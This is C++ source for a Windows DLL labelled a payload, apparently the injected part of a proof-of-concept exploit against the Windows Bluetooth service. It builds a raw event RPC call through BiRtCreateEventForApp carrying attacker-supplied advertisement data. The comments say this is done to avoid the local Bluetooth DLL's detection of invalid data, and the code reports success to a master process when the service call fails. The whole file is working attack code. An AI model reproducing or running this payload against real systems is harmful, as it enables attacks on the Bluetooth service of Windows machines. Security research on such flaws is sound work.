#include <Windows.h>
#include <stdint.h>
#include <functional>
#include <vector>

#include "..\shared\defines.h"

void NotifyMasterSucceeded()
{
    HANDLE hNotifyEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, L"bthlpe_payloadsuccess");
    if (hNotifyEvent)
    {
        SetEvent(hNotifyEvent);
        CloseHandle(hNotifyEvent);
    }
}

void NotifyMasterLoaded()
{
    HANDLE hNotifyEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, L"bthlpe_payloadloaded");
    if (hNotifyEvent)
    {
        SetEvent(hNotifyEvent);
        CloseHandle(hNotifyEvent);
    }
}

template <typename T, typename A, typename V>
T& ReadPtr(A addr, V offset)
{
    return *reinterpret_cast<T*>(reinterpret_cast<uint8_t*>(addr) + static_cast<uint64_t>(offset));
}

// Reverse engineered from Windows.Devices.Bluetooth.dll
enum class BR_VALUE_TYPE
{
    INT = 0,
    BUFFER = 4,
};

// Reverse engineered from Windows.Devices.Bluetooth.dll
struct __declspec(align(8)) BR_BUFFER
{
    uint64_t m_Size;
    const void* m_Data;
};

// Reverse engineered from Windows.Devices.Bluetooth.dll
struct __declspec (align(8)) BR_EVENT_PARAMETER
{
    BR_EVENT_PARAMETER(const wchar_t* name, int32_t value)
    {
        m_Name = name;
        m_Type = BR_VALUE_TYPE::INT;
        m_IntValue = value;
    }

    BR_EVENT_PARAMETER(const wchar_t* name, const BR_BUFFER& value)
    {
        m_Name = name;
        m_Type = BR_VALUE_TYPE::BUFFER;
        m_BufValue = value;
    }

    const wchar_t* m_Name;
    BR_VALUE_TYPE m_Type;
    union
    {
        int32_t m_IntValue;
        BR_BUFFER m_BufValue;
    };
};

// We craft the event RPC packet ourselves
// This is to avoid detection of "invalid" advertisement data by the locally loaded bth dll
// Once bthserv receives the packet, it will call BluetoothLEAdvertisementPublisherTrigger::Create within Windows.Internal.Bluetooth.dll
extern "C" __declspec(dllexport) void DeployPayload(void* param)
{
    const size_t dataSize = ReadPtr<size_t>(param, 0);
    const uint8_t* dataBytes = &ReadPtr<const uint8_t>(param, sizeof(size_t));
    std::vector<uint8_t> advData(dataBytes,  dataBytes + dataSize);

    // Fetch the pointer to BiRtCreateEventForApp
    using BiRtCreateEventForAppFn = HRESULT(GUID&, GUID&, int64_t, BR_BUFFER&);
    HMODULE biWinRtModule = GetModuleHandle(L"biwinrt.dll");
    std::function<BiRtCreateEventForAppFn> createEventForApp = reinterpret_cast<BiRtCreateEventForAppFn*>(GetProcAddress(biWinRtModule, "BiRtCreateEventForApp"));

    // event parameters, taken from BluetoothLEAdvertisementPublisherTrigger::Create
    std::vector<BR_EVENT_PARAMETER> eventParameters;
    eventParameters.emplace_back(L"EventType", 4);
    eventParameters.emplace_back(L"Version", 3);
    eventParameters.emplace_back(L"UseExtendedFormat", 1);
    eventParameters.emplace_back(L"IsAnonymous", 0);
    eventParameters.emplace_back(L"IncludeTransmitPowerLevel", 0);
    eventParameters.emplace_back(L"AdvertisementPayload", BR_BUFFER{ advData.size(), advData.data() });

    GUID zeroGuid = {};
    BR_BUFFER eventParams = { eventParameters.size(), eventParameters.data() };

    // Bluetooth GUID, taken from Windows.Devices.Bluetooth.dll
    uint8_t bthEventBrokerGuidBytes[] = { 0x62, 0xE9, 0xCA, 0xFC, 0x22, 0x47, 0xC7, 0x40, 0xA4, 0x6D, 0xFE, 0x51, 0x53, 0x28, 0x07, 0x23 };
    GUID bthEventBrokerGuid = {};
    memcpy(&bthEventBrokerGuid, bthEventBrokerGuidBytes, sizeof(GUID));

    // Send our event
    HRESULT res = createEventForApp(zeroGuid, bthEventBrokerGuid, 0, eventParams);
    if (HRESULT_CODE(res) == RPC_S_CALL_FAILED || HRESULT_CODE(res) == RPC_S_INVALID_ARG)
    {
        NotifyMasterSucceeded();
    }
}

extern "C" __declspec(dllexport) void Unload()
{
    FreeLibraryAndExitThread(GetModuleHandle(PAYLOAD_DLL_NAME), 0);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        NotifyMasterLoaded();
        break;
    default:
        break;
    }
    return TRUE;
}